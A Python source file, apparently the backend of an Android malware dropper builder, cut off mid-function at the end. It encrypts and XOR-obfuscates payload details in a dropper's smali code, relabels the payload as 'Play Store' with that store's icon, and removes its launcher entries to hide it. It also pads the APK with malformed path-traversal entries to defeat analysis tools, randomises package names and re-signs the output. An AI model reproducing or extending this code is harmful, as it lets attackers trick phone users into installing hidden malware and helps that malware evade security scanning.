import io
import os
import random
import re
import secrets
import shutil
import string
import subprocess
import xml.etree.ElementTree as ET
import zipfile

from Crypto.Cipher import AES
from werkzeug.utils import secure_filename

from config import BASE_DIR, Config
from services.build_state import BUILD_STATUS
from services.data import add_build_history, add_history, update_amplification
from services.java_runtime import JAVA_BIN, java_env, keytool_bin


def encrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).encrypt(data)


def decrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).decrypt(data)


def _xor_bytes(data: bytes, xor_byte: int) -> bytes:
    return bytes(b ^ xor_byte for b in data)


def _smali_byte(value: int) -> str:
    value &= 0xFF
    if value == 0:
        return "        0x0t"
    if value < 0x80:
        return f"        0x{value:x}t"
    neg = value - 0x100
    return f"        -0x{(-neg):x}t"


def _smali_array_data(data: bytes) -> str:
    lines = "\n".join(_smali_byte(b) for b in data)
    return f"    .array-data 1\n{lines}\n    .end array-data"


def _replace_smali_array(content: str, label: str, data: bytes) -> str:
    pattern = rf"(:{re.escape(label)}\s*\n)\s*\.array-data 1\n.*?\n\s*\.end array-data"
    repl = rf"\1{_smali_array_data(data)}"
    new_content, n = re.subn(pattern, repl, content, count=1, flags=re.S)
    if n != 1:
        raise RuntimeError(f"Falha ao patchar array smali :{label} (matches={n})")
    return new_content


def patch_vd_crypto_smali(
    dropper_work: str,
    *,
    asset_name: str,
    out_name: str,
    key: bytes,
    iv: bytes,
    cipher: str,
    xor_byte: int | None = None,
) -> None:
    xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte
    path = os.path.join(dropper_work, "smali", "vd.smali")
    if not os.path.isfile(path):
        raise RuntimeError("vd.smali nao encontrado no template Wi-Fi.")

    if len(key) != 32:
        raise RuntimeError("AES key deve ter 32 bytes.")
    if len(iv) != 16:
        raise RuntimeError("AES IV deve ter 16 bytes.")
    if len(out_name) != 14:
        raise RuntimeError(
            f"out_name deve ter 14 chars (shell R8 v0=0xe); got {len(out_name)}: {out_name!r}"
        )

    asset_enc = _xor_bytes(asset_name.encode("utf-8"), xor_byte)
    out_enc = _xor_bytes(out_name.encode("utf-8"), xor_byte)
    key_enc = _xor_bytes(key, xor_byte)
    iv_enc = _xor_bytes(iv, xor_byte)
    cipher_enc = _xor_bytes(cipher.encode("utf-8"), xor_byte)

    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    content, n = re.subn(
        r"const/16 v2, 0x[0-9a-fA-F]+(\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"new-array v2, v2, \[B\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"fill-array-data v2, :array_d)",
        rf"const/16 v2, 0x{len(asset_enc):x}\1",
        content,
        count=1,
    )
    if n != 1:
        content, n = re.subn(
            r"const/16 v2, 0x[0-9a-fA-F]+(\s+new-array v2, v2, \[B\s+fill-array-data v2, :array_d)",
            rf"const/16 v2, 0x{len(asset_enc):x}\1",
            content,
            count=1,
        )
    if n != 1:
        raise RuntimeError(f"Falha ao patchar tamanho array_d (matches={n})")

    content, n = re.subn(
        r"const/16 v2, 0x[0-9a-fA-F]+(\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"new-array v2, v2, \[B\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"fill-array-data v2, :array_10)",
        rf"const/16 v2, 0x{len(cipher_enc):x}\1",
        content,
        count=1,
    )
    if n != 1:
        content, n = re.subn(
            r"const/16 v2, 0x[0-9a-fA-F]+(\s+new-array v2, v2, \[B\s+fill-array-data v2, :array_10)",
            rf"const/16 v2, 0x{len(cipher_enc):x}\1",
            content,
            count=1,
        )
    if n != 1:
        raise RuntimeError(f"Falha ao patchar tamanho array_10 (matches={n})")

    content = _replace_smali_array(content, "array_d", asset_enc)
    content = _replace_smali_array(content, "array_e", key_enc)
    content = _replace_smali_array(content, "array_f", iv_enc)
    content = _replace_smali_array(content, "array_10", cipher_enc)
    content = _replace_smali_array(content, "array_12", out_enc)

    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)


def _axml_string_pool(data: bytes) -> list[str]:
    import struct

    off = 8
    pool_off = None
    while off + 8 <= len(data):
        typ, _header_size, size = struct.unpack_from("<HHI", data, off)
        if typ == 0x0001:
            pool_off = off
            break
        if size == 0:
            break
        off += size
    if pool_off is None:
        return []

    string_count, _style_count, flags, strings_start, _styles_start = struct.unpack_from(
        "<IIIII", data, pool_off + 8
    )
    is_utf8 = bool(flags & (1 << 8))
    base = pool_off + 8 + 20
    offsets = [
        struct.unpack_from("<I", data, base + i * 4)[0] for i in range(string_count)
    ]
    str_data_off = pool_off + strings_start
    out: list[str] = []
    for o in offsets:
        p = str_data_off + o
        if p >= len(data):
            out.append("")
            continue
        if is_utf8:

            def _uleb(buf: bytes, i: int) -> tuple[int, int]:
                n = buf[i]
                i += 1
                if n & 0x80:
                    n = ((n & 0x7F) << 8) | buf[i]
                    i += 1
                return n, i

            _, p = _uleb(data, p)
            length, p = _uleb(data, p)
            out.append(data[p : p + length].decode("utf-8", "replace"))
        else:
            length = struct.unpack_from("<H", data, p)[0]
            p += 2
            if length & 0x8000:
                length = ((length & 0x7FFF) << 16) | struct.unpack_from("<H", data, p)[0]
                p += 2
            out.append(data[p : p + length * 2].decode("utf-16-le", "replace"))
    return out


def extract_apk_package_name(apk_path: str) -> str:
    with zipfile.ZipFile(apk_path, "r") as zf:
        try:
            man = zf.read("AndroidManifest.xml")
        except KeyError as exc:
            raise RuntimeError("APK payload sem AndroidManifest.xml") from exc

    if man.lstrip().startswith(b"<?xml") or man.lstrip().startswith(b"<"):
        try:
            root = ET.fromstring(man)
            pkg = root.attrib.get("package") or root.attrib.get(
                "{http://schemas.android.com/apk/res/android}package"
            )
            if pkg:
                return pkg.strip()
        except ET.ParseError:
            pass

    strings = _axml_string_pool(man)
    pkg_re = re.compile(r"^[a-zA-Z][\w]*(?:\.[a-zA-Z][\w]*)+$")
    skip_prefixes = (
        "android.",
        "androidx.",
        "com.android.",
        "java.",
        "javax.",
        "kotlin",
        "okhttp",
        "okio",
        "org.apache",
        "org.xml",
        "org.w3c",
        "com.google.android",
        "com.google.firebase",
        "com.google.gms",
    )
    cands = []
    for s in strings:
        if not pkg_re.match(s):
            continue
        if any(s.startswith(p) for p in skip_prefixes):
            continue
        if "permission" in s.lower() or "intent" in s.lower():
            continue
        cands.append(s)

    for c in cands:
        if any(s.startswith(c + ".") for s in strings):
            return c
    if cands:
        cands.sort(key=lambda s: (s.count("."), len(s)), reverse=True)
        return cands[0]
    raise RuntimeError(f"Nao foi possivel extrair package do payload: {apk_path}")


def _find_main_activity_smali(dropper_work: str) -> str:
    smali_root = os.path.join(dropper_work, "smali")
    for root_dir, _, files in os.walk(smali_root):
        if "MainActivity.smali" in files and root_dir.replace("\\", "/").endswith("/ui"):
            return os.path.join(root_dir, "MainActivity.smali")
    raise RuntimeError("MainActivity.smali nao encontrado apos rename.")


def _patch_mainactivity_prefer_tp_asset(dropper_work: str) -> None:
    path = _find_main_activity_smali(dropper_work)
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    marker = "# prefer_tp_asset"
    if marker in content:
        return

    method_m = re.search(
        r"\.method public final A\(\)Ljava/lang/String;[\s\S]*?\.end method",
        content,
    )
    if not method_m:
        raise RuntimeError("Metodo A() nao encontrado em MainActivity.smali")

    method = method_m.group(0)
    if ":cond_1" not in method or ":cond_3" not in method:
        raise RuntimeError("Labels cond_1/cond_3 ausentes em MainActivity.A()")

    patched_method, n = re.subn(
        r"(:cond_1\n)(\s*:try_start_0\n)",
        rf"\1    {marker}\n    goto :cond_3\n\n\2",
        method,
        count=1,
    )
    if n != 1:
        raise RuntimeError(f"Falha ao inserir goto :cond_3 em A() (matches={n})")

    content = content[: method_m.start()] + patched_method + content[method_m.end() :]
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)


PAYLOAD_DISPLAY_NAME = "Play Store"
PAYLOAD_DISPLAY_ICON = os.path.join(BASE_DIR, "assets", "play_store_icon.png")


def _extract_launch_class(manifest_xml: str, payload_package: str) -> str:
    pkg = (payload_package or "").strip()
    a1 = re.search(
        r'<activity-alias\b[^>]*android:name="([^"]+\.A1)"[^>]*android:targetActivity="([^"]+)"',
        manifest_xml,
        flags=re.I,
    )
    if not a1:
        a1 = re.search(
            r'<activity-alias\b[^>]*android:targetActivity="([^"]+)"[^>]*android:name="([^"]+\.A1)"',
            manifest_xml,
            flags=re.I,
        )
        if a1:
            return a1.group(1).strip()
    elif a1:
        return a1.group(2).strip()

    for m in re.finditer(
        r"(<activity-alias\b[\s\S]*?</activity-alias>)",
        manifest_xml,
        flags=re.I,
    ):
        block = m.group(1)
        if "android.intent.category.LAUNCHER" not in block and (
            "android.intent.category.LEANBACK_LAUNCHER" not in block
        ):
            continue
        tgt = re.search(r'android:targetActivity="([^"]+)"', block)
        if tgt:
            return tgt.group(1).strip()

    for m in re.finditer(
        r"(<activity\b[\s\S]*?</activity>)",
        manifest_xml,
        flags=re.I,
    ):
        block = m.group(1)
        if "android.intent.category.LAUNCHER" not in block:
            continue
        name = re.search(r'android:name="([^"]+)"', block)
        if name:
            n = name.group(1).strip()
            if n.startswith("."):
                n = pkg + n if pkg else n
            elif "." not in n and pkg:
                n = f"{pkg}.{n}"
            return n

    if pkg:
        return f"{pkg}.Splasher"
    raise RuntimeError("Nao foi possivel determinar launch_class do payload")


def _strip_launcher_categories(manifest_xml: str) -> tuple[str, int]:
    pattern = (
        r"[ \t]*<category\s+android:name=\"android\.intent\.category\."
        r"(?:LAUNCHER|LEANBACK_LAUNCHER)\"\s*/>\s*\n?"
    )
    return re.subn(pattern, "", manifest_xml, flags=re.I)


def prepare_payload(
    payload_apk_path: str,
    work_base: str,
    build_id: str,
) -> tuple[str, str]:
    if not os.path.isfile(payload_apk_path):
        raise RuntimeError(f"payload ausente: {payload_apk_path}")
    if not JAVA_BIN:
        raise RuntimeError("Java nao encontrado para prepare_payload")
    if not os.path.isfile(Config.APKTOOL_JAR):
        raise RuntimeError("apktool.jar nao encontrado")
    if not os.path.isfile(PAYLOAD_DISPLAY_ICON):
        raise RuntimeError(f"icone Play Store ausente: {PAYLOAD_DISPLAY_ICON}")

    work_dir = os.path.join(work_base, f"{build_id}_payload_prep")
    if os.path.exists(work_dir):
        shutil.rmtree(work_dir)
    os.makedirs(work_dir, exist_ok=True)

    decode_dir = os.path.join(work_dir, "decoded")
    built_apk = os.path.join(work_dir, "built.apk")
    aligned_apk = os.path.join(work_dir, "aligned.apk")
    signed_apk = os.path.join(work_dir, "payload_prepared.apk")

    try:
        dec = subprocess.run(
            [
                JAVA_BIN,
                "-jar",
                Config.APKTOOL_JAR,
                "d",
                payload_apk_path,
                "-o",
                decode_dir,
                "-f",
            ],
            capture_output=True,
            text=True,
            timeout=300,
            env=java_env(),
        )
        if dec.returncode != 0 or not os.path.isdir(decode_dir):
            err = (dec.stderr or dec.stdout or "apktool d falhou").strip()
            raise RuntimeError(f"apktool d payload: {err[:400]}")

        man_path = os.path.join(decode_dir, "AndroidManifest.xml")
        if not os.path.isfile(man_path):
            raise RuntimeError("payload decode sem AndroidManifest.xml")

        with open(man_path, "r", encoding="utf-8", errors="ignore") as handle:
            man = handle.read()

        pkg_m = re.search(r'package="([^"]+)"', man)
        payload_package = pkg_m.group(1).strip() if pkg_m else extract_apk_package_name(
            payload_apk_path
        )
        launch_class = _extract_launch_class(man, payload_package)

        man, removed = _strip_launcher_categories(man)
        if removed < 1:
            print(
                f"[build {build_id}] prepare_payload: nenhum LAUNCHER removido "
                f"(payload ja oculto?)"
            )
        with open(man_path, "w", encoding="utf-8") as handle:
            handle.write(man)

        def _set_my_app_name(strings_xml: str) -> None:
            try:
                tree = ET.parse(strings_xml)
                root = tree.getroot()
                updated = False
                for string_node in root.findall("string"):
                    if string_node.get("name") == "my_app_name":
                        string_node.text = PAYLOAD_DISPLAY_NAME
                        updated = True
                        break
                if not updated:
                    el = ET.SubElement(root, "string", {"name": "my_app_name"})
                    el.text = PAYLOAD_DISPLAY_NAME
                tree.write(strings_xml, encoding="utf-8", xml_declaration=True)
            except Exception as exc:
                with open(strings_xml, "r", encoding="utf-8", errors="ignore") as handle:
                    sx = handle.read()
                sx2, n = re.subn(
                    r'(<string\s+name="my_app_name">)[^<]*(</string>)',
                    rf"\g<1>{PAYLOAD_DISPLAY_NAME}\2",
                    sx,
                    count=1,
                )
                if n != 1:
                    raise RuntimeError(f"falha ao setar my_app_name: {exc}") from exc
                with open(strings_xml, "w", encoding="utf-8") as handle:
                    handle.write(sx2)

        strings_hits = 0
        res_dir = os.path.join(decode_dir, "res")
        if os.path.isdir(res_dir):
            for entry in os.listdir(res_dir):
                if not entry.startswith("values"):
                    continue
                strings_xml = os.path.join(res_dir, entry, "strings.xml")
                if os.path.isfile(strings_xml):
                    _set_my_app_name(strings_xml)
                    strings_hits += 1
        if strings_hits < 1:
            raise RuntimeError("res/values*/strings.xml ausente no payload")

        logo_hits = 0
        for root_dir, _, files in os.walk(os.path.join(decode_dir, "res")):
            if "my_app_logo.png" in files:
                shutil.copy2(
                    PAYLOAD_DISPLAY_ICON, os.path.join(root_dir, "my_app_logo.png")
                )
                logo_hits += 1
        if logo_hits < 1:
            drawable = os.path.join(decode_dir, "res", "drawable")
            os.makedirs(drawable, exist_ok=True)
            shutil.copy2(PAYLOAD_DISPLAY_ICON, os.path.join(drawable, "my_app_logo.png"))

        bld = subprocess.run(
            [
                JAVA_BIN,
                "-jar",
                Config.APKTOOL_JAR,
                "b",
                decode_dir,
                "-o",
                built_apk,
            ],
            capture_output=True,
            text=True,
            timeout=300,
            env=java_env(),
        )
        if bld.returncode != 0 or not os.path.isfile(built_apk):
            err = (bld.stderr or bld.stdout or "apktool b falhou").strip()
            raise RuntimeError(f"apktool b payload: {err[:400]}")

        zipalign_apk(built_apk, aligned_apk)
        sign_release_apk(aligned_apk, signed_apk)
        if not os.path.isfile(signed_apk):
            raise RuntimeError("payload assinado nao gerado")

        print(
            f"[build {build_id}] prepare_payload ok -> "
            f"label={PAYLOAD_DISPLAY_NAME!r} launch={launch_class} "
            f"launchers_removed={removed}"
        )
        return signed_apk, launch_class
    except Exception:
        raise


def patch_w_explicit_launch(dropper_work: str, launch_class: str) -> None:
    launch_class = (launch_class or "").strip()
    if not launch_class or " " in launch_class or "\"" in launch_class:
        raise RuntimeError(f"launch_class invalida: {launch_class!r}")

    path = _find_main_activity_smali(dropper_work)
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    marker = "# explicit_launch"
    method_m = re.search(
        r"\.method public final w\(Ljava/lang/String;\)V[\s\S]*?\.end method",
        content,
    )
    if not method_m:
        raise RuntimeError("Metodo w() nao encontrado em MainActivity.smali")

    method = method_m.group(0)
    if marker in method:
        method2, n = re.subn(
            r'const-string v2, "[^"]+"\n(\s*invoke-virtual \{v1, p1, v2\}, '
            r"Landroid/content/Intent;->setClassName)",
            f'const-string v2, "{launch_class}"\n\1',
            method,
            count=1,
        )
        if n != 1:
            raise RuntimeError("Falha ao atualizar launch_class em w() ja patcheado")
        content = content[: method_m.start()] + method2 + content[method_m.end() :]
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(content)
        return

    explicit_block = f"""    :cond_1
    :try_start_1
    {marker}
    new-instance v1, Landroid/content/Intent;

    invoke-direct {{v1}}, Landroid/content/Intent;-><init>()V

    const-string v2, "{launch_class}"

    invoke-virtual {{v1, p1, v2}}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x10000000

    invoke-virtual {{v1, v2}}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {{p0, v1}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

"""

    patched_method, n = re.subn(
        r"    :cond_1\n    :try_start_1\n[\s\S]*?(?=    :cond_2\n)",
        explicit_block,
        method,
        count=1,
    )
    if n != 1:
        raise RuntimeError(f"Falha ao patchar fallback de w() (matches={n})")

    content = content[: method_m.start()] + patched_method + content[method_m.end() :]
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)


def bind_target_package(
    dropper_work: str,
    payload_package: str,
    *,
    xor_byte: int | None = None,
) -> None:
    payload_package = (payload_package or "").strip()
    if not payload_package or "." not in payload_package:
        raise RuntimeError(f"package payload invalido: {payload_package!r}")

    xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte

    assets_dir = os.path.join(dropper_work, "assets")
    os.makedirs(assets_dir, exist_ok=True)
    tp_path = os.path.join(assets_dir, ".tp")
    with open(tp_path, "w", encoding="utf-8") as handle:
        handle.write(payload_package + "\n")

    manifest_path = os.path.join(dropper_work, "AndroidManifest.xml")
    if os.path.isfile(manifest_path):
        with open(manifest_path, "r", encoding="utf-8", errors="ignore") as handle:
            man = handle.read()
        new_man, n = re.subn(
            r'(<queries>\s*<package\s+android:name=")([^"]+)("\s*/>\s*</queries>)',
            rf"\g<1>{payload_package}\3",
            man,
            count=1,
            flags=re.S,
        )
        if n != 1:
            new_man, n = re.subn(
                r'(android:name=")com\.google\.rbp(")',
                rf"\1{payload_package}\2",
                man,
                count=1,
            )
        if n < 1:
            raise RuntimeError("Falha ao patchar <queries> package no AndroidManifest.xml")
        with open(manifest_path, "w", encoding="utf-8") as handle:
            handle.write(new_man)

    if len(payload_package) == 14:
        vd_path = os.path.join(dropper_work, "smali", "vd.smali")
        if os.path.isfile(vd_path):
            with open(vd_path, "r", encoding="utf-8", errors="ignore") as handle:
                vd = handle.read()
            y_enc = _xor_bytes(payload_package.encode("utf-8"), xor_byte)
            vd = _replace_smali_array(vd, "array_11", y_enc)
            with open(vd_path, "w", encoding="utf-8") as handle:
                handle.write(vd)
    else:
        _patch_mainactivity_prefer_tp_asset(dropper_work)


def patch_payload_util_smali(*args, **kwargs):
    raise RuntimeError(
        "patch_payload_util_smali removido: use patch_vd_crypto_smali (template Wi-Fi)."
    )


def generate_package_name(app_name=None):
    mid = "".join(secrets.choice(string.ascii_lowercase) for _ in range(5))
    end = secrets.choice(string.ascii_lowercase) + "".join(
        secrets.choice(string.ascii_lowercase + string.digits) for _ in range(3)
    )
    pkg = f"com.{mid}.{end}"
    if len(pkg) != 14:
        raise RuntimeError(f"package length bug: {pkg!r} len={len(pkg)}")
    return pkg


def apply_package_rename(dropper_work, old_package, new_package):
    old_path = old_package.replace(".", "/")
    new_path = new_package.replace(".", "/")
    old_smali_dir = os.path.join(dropper_work, "smali", old_path)
    new_smali_dir = os.path.join(dropper_work, "smali", new_path)

    for root_dir, _, files in os.walk(dropper_work):
        for file in files:
            if not file.endswith((".smali", ".xml")):
                continue
            file_path = os.path.join(root_dir, file)
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as file_handle:
                    content = file_handle.read()
                new_content = content.replace(old_package, new_package).replace(old_path, new_path)
                if new_content != content:
                    with open(file_path, "w", encoding="utf-8") as file_handle:
                        file_handle.write(new_content)
            except OSError:
                pass

    if not os.path.isdir(old_smali_dir):
        return

    os.makedirs(os.path.dirname(new_smali_dir), exist_ok=True)
    if os.path.exists(new_smali_dir):
        shutil.rmtree(new_smali_dir)
    shutil.move(old_smali_dir, new_smali_dir)

    smali_root = os.path.join(dropper_work, "smali")
    check_dir = os.path.dirname(old_smali_dir)
    while check_dir.startswith(smali_root) and check_dir != smali_root:
        try:
            if os.listdir(check_dir):
                break
            os.rmdir(check_dir)
            check_dir = os.path.dirname(check_dir)
        except OSError:
            break


def _set_status(build_id, status, progress, error=False, portal=None, owner=None, ephemeral=None):
    current = BUILD_STATUS.get(build_id, {})
    BUILD_STATUS[build_id] = {
        "status": status,
        "progress": progress,
        "error": error,
        "portal": portal if portal is not None else current.get("portal", "subscriber"),
        "owner": owner if owner is not None else current.get("owner"),
        "ephemeral": ephemeral if ephemeral is not None else current.get("ephemeral", False),
        "output_file": current.get("output_file"),
    }


def _epoch_date_time():
    return tuple(Config.ZIP_EPOCH_DATE_TIME)


def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> bytes:
    if payload_bytes[:4] != b"PK\x03\x04":
        return payload_bytes
    if not getattr(Config, "PAYLOAD_ZIP_NOISE", True):
        return payload_bytes

    noise_n = random.randint(Config.PAYLOAD_ZIP_NOISE_MIN, Config.PAYLOAD_ZIP_NOISE_MAX)
    junk_suffixes = (
        "..xml",
        "/..xml",
        "/\\\\.xml",
        "/....xml",
        ".xml/..",
        "/../x.xml",
        "\\\\.xml",
        "/./.xml",
    )
    anchors = (
        "AndroidManifest.xml",
        "classes.dex",
        "classes2.dex",
        "classes3.dex",
        "resources.arsc",
        "META-INF/MANIFEST.MF",
        "META-INF/CERT.SF",
        "kotlin/kotlin.kotlin_builtins",
        "res/layout/activity_main.xml",
        "res/values/public.xml",
        "lib/arm64-v8a/libapp.so",
        "assets/index.android.bundle",
    )

    sig_skip = (".SF", ".RSA", ".DSA", ".EC", "MANIFEST.MF", "CERT.SF", "CERT.RSA")

    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(payload_bytes), "r") as zin, zipfile.ZipFile(buf, "w") as zout:
        existing = set()
        for info in zin.infolist():
            name = info.filename
            base = name.rsplit("/", 1)[-1].upper()
            if name.startswith("META-INF/") and (
                base.endswith((".SF", ".RSA", ".DSA", ".EC"))
                or base in ("MANIFEST.MF", "CERT.SF", "CERT.RSA")
                or base.startswith("ANDROID")
            ):
                continue
            data = zin.read(name)
            out = zipfile.ZipInfo(filename=name, date_time=_epoch_date_time())
            out.compress_type = info.compress_type
            out.external_attr = info.external_attr
            out.create_system = info.create_system
            zout.writestr(out, data)
            existing.add(name)

        used = set(existing)
        for i in range(noise_n):
            anchor = random.choice(anchors)
            suffix = random.choice(junk_suffixes)
            extra = ""
            if random.random() < 0.35:
                extra = "/" + "".join(
                    random.choice(string.ascii_lowercase) for _ in range(random.randint(1, 6))
                )
            if random.random() < 0.25:
                extra += random.choice(["/..", "/.", "\\\\", "/..."])
            name = f"{anchor}{suffix}{extra}"
            if random.random() < 0.15:
                name = name.replace("/", "\\")
            if name in used or len(name) > 220:
                name = f"{anchor}/{i}{suffix}"
            if name in used:
                continue
            used.add(name)
            payload = secrets.token_bytes(random.randint(0, 48)) if random.random() < 0.4 else b""
            out = zipfile.ZipInfo(filename=name, date_time=_epoch_date_time())
            out.compress_type = zipfile.ZIP_DEFLATED if payload else zipfile.ZIP_STORED
            out.external_attr = 0o644 << 16
            zout.writestr(out, payload)

    noised = buf.getvalue()

    if work_dir:
        os.makedirs(work_dir, exist_ok=True)
        raw_path = os.path.join(work_dir, "payload_noise.apk")
        aligned_path = os.path.join(work_dir, "payload_aligned.apk")
        signed_path = os.path.join(work_dir, "payload_signed.apk")
        with open(raw_path, "wb") as fh:
            fh.write(noised)
        try:
            if os.path.isfile(Config.ZIPALIGN):
                zipalign_apk(raw_path, aligned_path)
            else:
                shutil.copy2(raw_path, aligned_path)
            sign_release_apk(aligned_path, signed_path)
            with open(signed_path, "rb") as fh:
                return fh.read()
        except Exception:
            return noised
        finally:
            for p in (raw_path, aligned_path, signed_path):
                try:
                    if os.path.isfile(p):
                        os.remove(p)
                except OSError:
                    pass
    return noised


def normalize_apk_zip_timestamps(apk_path: str) -> None:
    if not os.path.isfile(apk_path):
        raise RuntimeError(f"APK ausente para normalize timestamps: {apk_path}")
    tmp_path = f"{apk_path}.tsnorm"
    epoch = _epoch_date_time()
    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(tmp_path, "w") as zout:
        for info in zin.infolist():
            data = zin.read(info.filename)
            out = zipfile.ZipInfo(filename=info.filename, date_time=epoch)
            out.compress_type = info.compress_type
            out.external_attr = info.external_attr
            out.create_system = info.create_system
            zout.writestr(out, data)
    os.replace(tmp_path, apk_path)



def inject_unknown_into_apk(apk_path: str, dropper_work: str) -> int:
    unknown_dir = os.path.join(dropper_work, "unknown")
    if not os.path.isdir(unknown_dir):
        return 0

    skip_suffix = (".SF", ".RSA", ".DSA", ".EC")
    to_add = []
    for root, _, files in os.walk(unknown_dir):
        for name in files:
            full = os.path.join(root, name)
            rel = os.path.relpath(full, unknown_dir).replace("\\", "/")
            upper = name.upper()
            if rel.startswith("META-INF/") and (
                upper.endswith(skip_suffix) or upper == "MANIFEST.MF"
            ):
                continue
            to_add.append((rel, full))

    if not to_add:
        return 0

    epoch = _epoch_date_time()
    tmp_path = f"{apk_path}.unknown"
    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(tmp_path, "w") as zout:
        existing = set(zin.namelist())
        for info in zin.infolist():
            data = zin.read(info.filename)
            out = zipfile.ZipInfo(filename=info.filename, date_time=epoch)
            out.compress_type = info.compress_type
            out.external_attr = info.external_attr
            out.create_system = info.create_system
            zout.writestr(out, data)
        added = 0
        for rel, full in to_add:
            if rel in existing:
                continue
            with open(full, "rb") as handle:
                data = handle.read()
            out = zipfile.ZipInfo(filename=rel, date_time=epoch)
            out.compress_type = zipfile.ZIP_DEFLATED
            out.external_attr = 0o644 << 16
            zout.writestr(out, data)
            added += 1
    os.replace(tmp_path, apk_path)
    return added


def inject_unknown_meta_inf(apk_path: str, dropper_work: str) -> int:
    return inject_unknown_into_apk(apk_path, dropper_work)


def inject_secondary_dex(apk_path: str, dex_path: str, arcname: str = "classes2.dex") -> None:
    if not getattr(Config, "INJECT_SECONDARY_DEX", False):
        return
    if not os.path.isfile(dex_path):
        raise RuntimeError(f"DEX de libs nao encontrado: {dex_path}")
    if not os.path.isfile(apk_path):
        raise RuntimeError(f"APK para injecao de DEX nao encontrado: {apk_path}")

    tmp_path = f"{apk_path}.dexinject"
    epoch = _epoch_date_time()
    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(
        tmp_path, "w", compression=zipfile.ZIP_DEFLATED
    ) as zout:
        for info in zin.infolist():
            if info.filename == arcname:
                continue
            data = zin.read(info.filename)
            compress = (
                zipfile.ZIP_STORED if info.compress_type == zipfile.ZIP_STORED else zipfile.ZIP_DEFLATED
            )
            out_info = zipfile.ZipInfo(filename=info.filename, date_time=epoch)
            out_info.compress_type = compress
            out_info.external_attr = info.external_attr
            zout.writestr(out_info, data)
        out_info = zipfile.ZipInfo(filename=arcname, date_time=epoch)
        out_info.compress_type = zipfile.ZIP_DEFLATED
        with open(dex_path, "rb") as handle:
            zout.writestr(out_info, handle.read())
    os.replace(tmp_path, apk_path)


def apply_version_info(dropper_work: str, version_name: str, version_code: int) -> None:
    yml = os.path.join(dropper_work, "apktool.yml")
    if not os.path.isfile(yml):
        return
    with open(yml, "r", encoding="utf-8", errors="ignore") as handle:
        text = handle.read()
    text = re.sub(
        r"versionCode:\s*['\"]?\d+['\"]?",
        f"versionCode: '{version_code}'",
        text,
        count=1,
    )
    text = re.sub(
        r"versionName:\s*.*",
        f"versionName: {version_name}",
        text,
        count=1,
    )
    with open(yml, "w", encoding="utf-8") as handle:
        handle.write(text)


def _generate_keystore(
    keystore_path: str,
    store_pass: str,
    key_alias: str,
    key_pass: str,
    dname: str,
) -> None:
    keytool = keytool_bin()
    if not keytool:
        raise RuntimeError("keytool nao encontrado (JAVA_HOME/bin/keytool).")
    os.makedirs(os.path.dirname(keystore_path) or ".", exist_ok=True)
    cmd = [
        keytool,
        "-genkeypair",
        "-storetype",
        Config.KEYSTORE_STORE_TYPE,
        "-keystore",
        keystore_path,
        "-storepass",
        store_pass,
        "-keypass",
        key_pass,
        "-alias",
        key_alias,
        "-keyalg",
        Config.KEYSTORE_KEY_ALG,
        "-keysize",
        str(Config.KEYSTORE_KEY_SIZE),
        "-sigalg",
        Config.KEYSTORE_SIG_ALG,
        "-validity",
        str(Config.KEYSTORE_VALIDITY_DAYS),
        "-dname",
        dname,
    ]
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=60, env=java_env()
    )
    if result.returncode != 0:
        err = (result.stderr or result.stdout or "keytool falhou").strip()
        raise RuntimeError(f"Falha ao gerar keystore: {err[:300]}")


def ensure_release_keystore() -> tuple[str, str, str, str]:
    path = Config.RELEASE_KEYSTORE
    store_pass = Config.RELEASE_KEYSTORE_PASS
    key_pass = store_pass
    alias = Config.RELEASE_KEY_ALIAS
    if not os.path.isfile(path):
        _generate_keystore(path, store_pass, alias, key_pass, Config.RELEASE_DNAME)
    return path, store_pass, alias, key_pass


def zipalign_apk(input_apk: str, output_apk: str) -> None:
    if not os.path.isfile(Config.ZIPALIGN):
        raise RuntimeError("zipalign nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
    cmd = [Config.ZIPALIGN, "-p", "-f", "4", input_apk, output_apk]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0 or not os.path.isfile(output_apk):
        err = (result.stderr or result.stdout or "zipalign falhou").strip()
        raise RuntimeError(f"Falha no zipalign: {err[:300]}")


def sign_with_apksigner(
    aligned_apk: str,
    output_apk: str,
    *,
    keystore_path: str | None = None,
    store_pass: str | None = None,
    key_alias: str | None = None,
    key_pass: str | None = None,
    key_pk8: str | None = None,
    cert_pem: str | None = None,
) -> str:
    if not os.path.isfile(Config.APKSIGNER):
        raise RuntimeError("apksigner nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
    v3 = "true" if Config.APKSIGNER_V3_ENABLED else "false"
    cmd = [
        Config.APKSIGNER,
        "sign",
        "--v1-signing-enabled",
        "false",
        "--v2-signing-enabled",
        "true",
        "--v3-signing-enabled",
        v3,
        "--out",
        output_apk,
    ]
    if key_pk8 and cert_pem:
